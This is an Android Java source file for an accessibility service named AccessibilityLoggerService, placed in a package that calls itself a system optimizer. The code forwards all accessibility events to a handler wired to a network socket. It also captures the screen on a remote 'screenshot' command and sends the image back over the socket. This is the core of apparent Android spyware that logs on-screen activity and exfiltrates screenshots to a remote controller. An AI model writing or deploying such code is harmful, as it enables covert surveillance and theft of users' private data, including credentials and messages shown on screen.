package com.system.optimizer;

import com.system.optimizer.handler.AccessibilityEventHandler;
import com.system.optimizer.handler.ScreenshotCapture;
import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class AccessibilityLoggerService extends AccessibilityService {
    private static final String TAG = "AccessibilityLoggerService";

    private SocketManager socketManager;
    private ConfigManager configManager;
    private AccessibilityEventHandler accessibilityEventHandler;
    private ScreenshotCapture screenShotCapture;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "AccessibilityLoggerService onCreate - initializing components");

        try {
            this.configManager = new ConfigManager(this);

            this.socketManager = new SocketManager(this, configManager);

            this.screenShotCapture = new ScreenshotCapture(this, configManager);

            // Create text handler with screenshot capture reference
            this.accessibilityEventHandler = new AccessibilityEventHandler(screenShotCapture, socketManager);

            // Add listener for manual screenshot requests
            this.socketManager.addListener("screenshot", args -> {
                // Capture screenshot and send as response
                screenShotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
                    @Override
                    public void onSuccess(byte[] imageData) {
                        if (imageData != null) {
                            socketManager.sendEvent("screenshot_response", imageData);
                        }
                    }

                    @Override
                    public void onError(String errorMessage) {
                        socketManager.sendEvent("screenshot_error", errorMessage);
                    }
                }, true); // isManual=true for user-initiated requests
            });

            Log.d(TAG, "All components initialized successfully");
        } catch (Exception e) {
            // Log error but don't crash the service
            Log.e(TAG, "Error initializing components", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            accessibilityEventHandler.onAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            if (socketManager != null) {
                socketManager.disconnect(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        } finally {
            super.onDestroy();
        }
    }

}
